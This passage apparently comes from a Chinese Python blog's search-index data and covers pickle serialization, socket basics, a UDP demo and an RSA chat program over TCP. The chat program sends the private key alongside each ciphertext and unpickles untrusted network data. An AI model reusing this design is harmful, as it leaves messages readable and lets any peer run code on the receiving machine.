\"%s\"%(self.partName) return stringReppart1 = Part(\"Part 1\", 1, 3)part2 = Part(\"Part 2\", 4, 5) part3 = Part(\"Part 3\", 6, 7) bookTitle = \"Book yet to be written\";bookISBN = \"XXX-X-XX-XXXXXX-X\";bookParts = [part1, part2, part3]bookChapters = [\"Chapter 1\", \"Chapter 2\", \"Chapter 3\", \"Chapter 4\", \"Chapter 5\", \"Chapter 6\", \"Chapter 7\"];book = Book(bookTitle, bookISBN, bookParts, bookChapters)# 创建buffer存储pickle对象pickleBuffer = io.BytesIO()print(\"Pickling of the object into the memory buffer started\")# pickle.dump(book,pickleBuffer)print(\"Pickling of the object into the memory buffer ended\")print(\"Pickled buffer beginning address:\")print(pickleBuffer.getbuffer())print(\"Unpickling of the object from memory started\")#unpickledBook = pickle.loads(pickleBuffer.getbuffer())print(\"Unpickling of the object from memory ended\")print(\"Printing the attributes of unpickled object\")unpickledBook.identify() pickle.dumps()参数 pickle.dumps(obj, protocol=None,*,fix_imports=True) 与pickle.dump()区别，pickle.dumps()方法不需要写入文件中，他是直接返回一个序列化的bytes对象 ==反序列化==语法 pickle.load(file) 反序列化对象（将文件中数据解析为一个Python对象） ==注意==：load(file)时，要让Python能够找到类的定义,否则会报错 注意：参数file，必须是以二进制的形式进行操作（读取） 示例：819test_pickle.py 反序列方法pickle.loads() 参数如下： pickle.loads(bytes_object, *,fix_imports=True, encoding=”ASCII”. errors=”strict”) pickle.loads()方法是直接从bytes对象中读取序列化的信息，而非从文件中读取。示例如下： 12345&gt;&gt;&gt; import pickle&gt;&gt;&gt; pickle.dumps([1,2,3])b'\\x80\\x03]q\\x00(K\\x01K\\x02K\\x03e.'&gt;&gt;&gt; pickle.loads(_)[1, 2, 3] 1234567891011121314#load(file)时，要让Python能够找到类的定义,否则会报错import pickle class Person: def __init__(self,n,a): self.name=n self.age=a def show(self): print(self.name+\" \"+str(self.age)) aa = Person(\"JGood\", 2) aa.show() # del Personf=open('p.txt','wb') pickle.dump(aa,f,0) f.close() 123456 注释掉删除类对象操作，若未注释则会报错del Person f&#x3D;open(&#39;p.txt&#39;,&#39;rb&#39;) bb&#x3D;pickle.load(f) f.close() bb.show() 运行结果： 123(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py JGood 2JGood 2 未注释结果： 1234567891011121314 (venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ python 819test_pickle.py JGood 2Traceback (most recent call last): File &quot;819test_pickle.py&quot;, line 15, in &lt;module&gt; bb&#x3D;pickle.load(f) AttributeError: Can&#39;t get attribute &#39;Person&#39; on &lt;module &#39;__main__&#39; from &#39;819test_pickle.py&#39;&gt; [p.txt](p.txt)文件中数据存储格式： &#96;&#96;&#96;python &gt;&gt;&gt; with open(&#39;p.txt&#39;,&#39;rb&#39;) as f: ... f.read() ... b&#39;ccopy_reg\\n_reconstructor\\np0\\n(c__main__\\nPerson\\np1\\nc__builtin__\\nobject\\np2\\nNtp3\\nRp4\\n(dp5\\nVname\\np6\\nVJGood\\np7\\nsVage\\np8\\nL2L\\nsb.&#39;","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]},{"title":"python网络编程01","slug":"python网络编程01-socket-udp-tcp-rsa加密的全双工聊天程序","date":"2020-03-14T05:55:42.000Z","updated":"2020-03-30T05:51:24.632Z","comments":true,"path":"2020/03/14/python网络编程01-socket-udp-tcp-rsa加密的全双工聊天程序/","link":"","permalink":"https://fishni.github.io/2020/03/14/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B01-socket-udp-tcp-rsa%E5%8A%A0%E5%AF%86%E7%9A%84%E5%85%A8%E5%8F%8C%E5%B7%A5%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/","excerpt":"学习内容 了解socket基本概念 利用socket类方法获取主机、网络及目标服务的信息 UDP、TCP客户端/服务器编写 案例：python SOCKET实现RSA加密的全双工聊天程序","text":"学习内容 了解socket基本概念 利用socket类方法获取主机、网络及目标服务的信息 UDP、TCP客户端/服务器编写 案例：python SOCKET实现RSA加密的全双工聊天程序 学习步骤构建python环境同时开发多个python应用程序（共用一个Python，不同版本的包不兼容会产生无用包），利用virtualenv创建“Python虚拟环境”（小型、独立的、隔离功能的Python环境），从而避免产生无用包 利用virtualenvwrapper管理virtualenv虚拟环境 mkvirtualenv venv ：创建虚拟环境venv workon ：查看当前已有虚拟环境目录 workon venv ：进入venv虚拟环境 deactivate ：退出虚拟环境 rmvirtualenv venv：删除虚拟环境venv socket概念 运行在不同机器上的进程通过套接字发送报文来进行通信，套接字充当了两个进程通信的“中间人”，观察下图（OSI模型中）： 套接字是个通信端点，操作系统使用整数来标识套接字，Python使用socket.socket对象表示套接字（该对象内部表示的是操作系统标识套接字的整数，可利用fileno()方法查看），调用socket.socket对象的方法请求使用套接字的系统调用是，该对象会自动使用内部维护的套接字整数标识符 socket.socket对象的fileno()方法 1234&gt;&gt;&gt; import socket&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.fileno()3 IP地址、端口号 端口号（port）传输层协议内容、用来标识一个进程 一个端口号只能被一个进程占用 IP地址 + 端口号能标识网络上的某一台主机的某一个进程 套接字组成：IP地址和端口号就构成了一个网络中的唯一标识符，即套接字 套接字类型（常用的两种） 流套接字：创建socket对象时（用socket.SOCK_STREAM） 面向连接、可靠的数据传输服务。能够保证数据无差错、无重复、按顺序发送 数据包套接字：创建socket对象时，使用socket.SOCK_DGRAM 提供无连接服务。无需建立连接，只需将目的地址信息打包后发送；该服务使用UDP进行传输，延迟小且效率高，缺点不能保证数据传输的可靠性 利用socket类方法获取主机、网络及目标服务的信息 获取主机名、地址 12345&gt;&gt;&gt; import socket&gt;&gt;&gt; socket.gethostname()'fishmouse'&gt;&gt;&gt; socket.gethostbyname(_)'127.0.1.1' 获取远程设备IP地址（如获取：www.baidu.com） 12&gt;&gt;&gt; socket.gethostbyname('www.baidu.com')'14.215.177.38' 可看到socket.gethostbyname具有==域名解析的作用==，ping一下看通不通 12345(venv) yuhao@fishmouse:~&#x2F;Envs&#x2F;venv&#x2F;project$ ping 14.215.177.38PING 14.215.177.38 (14.215.177.38) 56(84) bytes of data.64 bytes from 14.215.177.38: icmp_seq&#x3D;1 ttl&#x3D;55 time&#x3D;37.9 ms64 bytes from 14.215.177.38: icmp_seq&#x3D;2 ttl&#x3D;55 time&#x3D;39.4 ms64 bytes from 14.215.177.38: icmp_seq&#x3D;3 ttl&#x3D;55 time&#x3D;34.8 ms IP地址格式转换（打包成32位二进制格式）：socket类方法inet_aton、inet_ntoa inet_aton()使用 123456&gt;&gt;&gt; ip_addr ='127.0.0.1'&gt;&gt;&gt; socket.inet_aton(ip_addr)b'\\x7f\\x00\\x00\\x01'&gt;&gt;&gt; import binascii&gt;&gt;&gt; binascii.hexlify(_)b'7f000001' 观察看到，转换后的32位二进制格式，并调用binasci.hexlify以16进制形式表示二进制数据 10进制结果，单个字节转换 123&gt;&gt;&gt;import struct&gt;&gt;&gt; struct.unpack('B',b'\\x7f')[0]127 inet_ntoa()使用：32位二进制包转换为IPv4地址 12345a的主机字节序----------网络字节序 ---------b的主机字节序&gt;&gt;&gt; ip_addr ='127.0.0.1'&gt;&gt;&gt; socket.inet_aton(ip_addr)b'\\x7f\\x00\\x00\\x01'&gt;&gt;&gt; socket.inet_ntoa(_)'127.0.0.1' 通过指定的端口和协议找到服务名 socket.getservbyport() 12345678910&gt;&gt;&gt; socket.getservbyport(80)'http'&gt;&gt;&gt; socket.getservbyport(53)'domain'&gt;&gt;&gt; socket.getservbyport(25)'smtp'&gt;&gt;&gt; socket.getservbyport(21)'ftp'&gt;&gt;&gt; socket.getservbyport(3306)'mysql' socket.getservbyname() ：通过服务名获取端口 1234&gt;&gt;&gt; socket.getservbyname('ssh')22&gt;&gt;&gt; socket.getservbyname('http')80 linux系统中，etc/services文件中可查看相关服务和端口 主机字节序和网络字节序之间的转换 不同主机a，b之间通信，数据格式需转换 a的固有数据存储——-标准化——–转化成b的固有格式 也即为： ==a的主机字节序———-网络字节序 ———b的主机字节序== 主机字节序 主机内部，内存中数据的处理方式，可以分为两种： 大端字节序：按照内存的增长方向，高位数据存储在高位内存中 小端字节序：按照内存的增长方向，高位数据存储在低位内存中 socket.ntohl()、socket.htonl()、ntohs()、htons() 1234567891011&gt;&gt;&gt; data = 1234&gt;&gt;&gt; socket.htonl(data)3523477504&gt;&gt;&gt; socket.htons(data)53764&gt;&gt;&gt; socket.ntohl(data)3523477504&gt;&gt;&gt; socket.ntohs(data)53764 &gt;&gt;&gt; socket.ntohs(53764)1234 设定并获取默认的套接字超时时间 socket.gettimeout()、socket.settimeout() 12345&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.gettimeout()&gt;&gt;&gt; s.settimeout(100)&gt;&gt;&gt; s.gettimeout()100.0 默认套接字超时时间为0 套接字错误异常处理 try…except 套接字异常类型 as 参数… argparse：命令项选项与参数解析的模块 parser=argparse.ArgumentParser()：创建解析对象 parser.add_argument()：向对象中添加关注的命令行参数和选项 given_args = parser.parse_args()：对象解析 套接字发送和接收的缓冲区大小修改 socket中getsockopt()、setsockopt()方法 套接字阻塞模式和非阻塞模式 s= socket.socket() s.setblocking(1)：设为阻塞模式 s.setblocking(0)：设为非阻塞模式 默认情况下，TCP套接字处于阻塞模式 UDP 多路复用：允许多个会话共享同一介质或机制的一种解决方案 UDP支持多路复用：UDP协议提供端口号，用于对目标为同一机器上不同服务的多个数据包进行适当的多路分解 TCP：多路复用、可靠传输 UDP机制：仅使用IP地址和端口进行标识，以此将数据包发送至目标地址 使用自环接口的UDP服务器和 客户端 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# UDP client and server on localhost# 814udp_local.py import argparse, socketfrom datetime import datetimeMAX_BYTES = 65535# serverdef server(port): sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) sock.bind(('127.0.0.1',port)) # getsockname()返回sock示例对象的（地址，端口) print(\"Listening at &#123;&#125;\".format(sock.getsockname())) while True: data, address = sock.recvfrom(MAX_BYTES) text = data.decode('ascii') print(\"The client at &#123;&#125; says &#123;!r&#125;\".format(address,text)) text = 'Your data was &#123;&#125; bytes long '.format(len(data)) data = text.encode('ascii') sock.sendto(data,address)# 客户端def client(port): sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) text = 'The time is &#123;&#125;'.format(datetime.now()) data = text.encode('ascii') sock.sendto(data,('127.0.0.1',port)) # sock.getsockname()获取当前进程的（地址，端口）元组信息 print('The OS assigned me the address &#123;&#125;'.format(sock.getsockname())) data, address = sock.recvfrom(MAX_BYTES) text = data.decode() # format格式化字符串 print('The server &#123;&#125; replied &#123;!r&#125;'.format(address,text))if __name__ == '__main__': # 字典 choices = &#123;'client':client,'server':server&#125; # 创建参数解析对象 parser = argparse.ArgumentParser(description='Send and receive UDP locally') #添加要解析的参数 parser.add_argument('role',choices=choices,help ='which role to play') parser.add_argument('-p',metavar='PORT',type=int,default=1060,help='UDP port (default 1060)') # 参数解析 args = parser.parse_args() # 调用服务端或客户端函数 function = choices[args.role] function(args.p) 先运行服务端 python 814udp_local.py server 结果： Listening at (‘127.0.0.1’, 1060)The client at (‘127.0.0.1’, 60945) says ‘The time is 2019-08-16 16:34:56.276877’ 再运行客户端 python 814udp_local.py client The OS assigned me the address (‘0.0.0.0’, 60945)The server (‘127.0.0.1’, 1060) replied ‘Your data was 38 bytes long ‘ 混杂客户端与垃圾回复 814udp_local.py代码中，客户端程序存在安全隐患，如fg果服务端响应延迟一会，攻击者伪装成服务器的一个响应，客户端并没有检查是否是真正服务器的响应 先运行服务器，再将服务器暂停，创建一个快速发送信息的响应给客户端，再==fg命令==将暂停的服务器开启 客户端 观察到，客户端收到的数据实际上是伪装的数据，真正的服务器的响应没到客户端 混杂客户端 不考虑地址是否正确，接收并处理所有收到的数据包的网络监听客户端在技术上叫 作混杂( promiscuous )客户端 python SOCKET实现RSA加密的全双工聊天程序实现 题目背景 RSA加密解密是利用非对称秘钥解决传输过程中机密性的问题，将之用在聊天程序上，其中使用rsa模块，发送方生产公钥和私钥，然后使用公钥将信息加密后，利用pickle模块封装加密后的消息和私钥，然后发送给接收方，接收方同样通过pickle模块将消息进行解封，使用发送过来的私钥将消息解密，并将内容打印在屏幕上 题目要点 传输协议：TCP套接字创建客户端和服务端_ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 数据传输格式：pickle序列化数据 pickle.dumps()序列化 pickle.loads()反序列化 1234567891011&gt;&gt;&gt; import pickle&gt;&gt;&gt; encryptdata = 'hello'&gt;&gt;&gt; key = 882321&gt;&gt;&gt; message = pickle.dumps([encryptdata,key])&gt;&gt;&gt; type(message)&lt;class 'bytes'&gt;&gt;&gt;&gt; messageb'\\x80\\x03]q\\x00(X\\x05\\x00\\x00\\x00helloq\\x01J\\x91v\\r\\x00e.'&gt;&gt;&gt; origndata = pickle.loads(message)&gt;&gt;&gt; origndata['hello', 882321] 数据加密方式：RSA加解密 123456789&gt;&gt;&gt;data = 'hello'&gt;&gt;&gt; import rsa&gt;&gt;&gt; (PubKey,PrivateKey) = rsa.newkeys(512)&gt;&gt;&gt; encryptdata = rsa.encrypt(data.encode(),PubKey)&gt;&gt;&gt; encryptdatab'=\\\\\\x1c\\x93]^(Z/\\xac\\x81\\xfd\\xffj!\\x0b:r\\xb0\\x1b\\xf9\\x97VZ\\xdf\\xe1\\x9e2\\xb4\\x05G4\\x01\\x9f\\xc8\\xfd\\x1e\\x00\\xa1\\xb7\\xbdU\\x98\\xbc\\x1e5\\xa1yy\\xee$\\xcd\\xf8\\x10\\xf4\\xba\\t\\x84\\xba\\x13\\x99hs\\x8d'&gt;&gt;&gt; decryptdata = rsa.decrypt(encryptdata,PrivateKey)&gt;&gt;&gt; decryptdatab'hello' 题目图解 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import rsaimport socketimport threadingimport pickle PORT = 4396BUFF = 1024 def RsaEncrypt(str): # 利用rsa产生公钥、私钥 (PubKey, PrivateKey) = rsa.newkeys(512) content = str.encode('utf8') # 使用公钥加密 Encrypt_Str = rsa.encrypt(content, PubKey) # 返回加密信息和私钥 return (Encrypt_Str, PrivateKey) def RsaDecrypt(str, pk): Decrypt_Str = rsa.decrypt(str, pk) Decrypt_Str_1 = Decrypt_Str.decode('utf8') return Decrypt_Str_1 def SendMessage(Sock, test): while True: SendData = input() # 加密要发送的数据 (encryptdata, PrivateKey) = RsaEncrypt(SendData) # 打印加密后的数据 print('encrypted data is ' + str(encryptdata)) # pickel封装加密后的数据和私钥 Message = pickle.dumps([encryptdata, PrivateKey]) if len(SendData) &gt; 0: Sock.send(Message) def RecvMessage(Sock, test): while True: # 接收数据 Message = Sock.recv(BUFF) # pickle解封数据 (recvdata, PrivateKey) = pickle.loads(Message) # 对加密的数据解密 decryptdata = RsaDecrypt(recvdata, PrivateKey) if len(Message)&gt;0: print(\"receive message:\" + decryptdata) def main(): type = input('please input server or client:') if type == 'server': # 创建套接字 ServerSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 端口绑定 ServerSock.bind(('127.0.0.1',PORT)) # 服务器允许连接的个数 ServerSock.listen(5) print(\"listening......\") while True: ConSock,addr = ServerSock.accept() print('connection succeed' + '\\n' + 'you can chat online') # 多线程运用 thread_1 = threading.Thread(target = SendMessage, args = (ConSock, None)) thread_2 = threading.Thread(target = RecvMessage, args = (ConSock, None)) thread_1.start() thread_2.start() elif type == 'client': ClientSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ServerAddr = input(\"please input the server's ip address:\") ClientSock.connect((ServerAddr, PORT)) print('connection succeed, chat start!') thread_3 = threading.Thread(target = SendMessage, args = (ClientSock, None)) thread_4 = threading.Thread(target = RecvMessage, args = (ClientSock, None)) thread_3.start() thread_4.start() if __name__ == '__main__': main() 结果演示 先启动server进行监听 启动客户端连接server 客户端向服务器发送消息 服务器端接收到消息，并将消息打印在屏幕上 分析 综上，该程序利用的是TCP套接字保证了传输的可靠性，并利用多线程进行信息交互，pickle封装数据，rsa产生公钥、私钥、和加/解密等操作","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]}],"categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Python基础","slug":"python/Python基础","permalink":"https://fishni.github.io/categories/python/Python%E5%9F%BA%E7%A1%80/"},{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"机器学习算法","slug":"人工智能/机器学习算法","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/"},{"name":"python网络编程","slug":"python/python网络编程","permalink":"https://fishni.github.io/categories/python/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://fishni.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"HTTP","slug":"HTTP","permalink":"https://fishni.github.io/tags/HTTP/"},{"name":"GaussianNB","slug":"GaussianNB","permalink":"https://fishni.github.io/tags/GaussianNB/"},{"name":"算法","slug":"算法","permalink":"https://fishni.github.io/tags/%E7%AE%97%E6%B3%95/"},{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"},{"name":"python网络编程","slug":"python网络编程","permalink":"https://fishni.github.io/tags/python%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}]}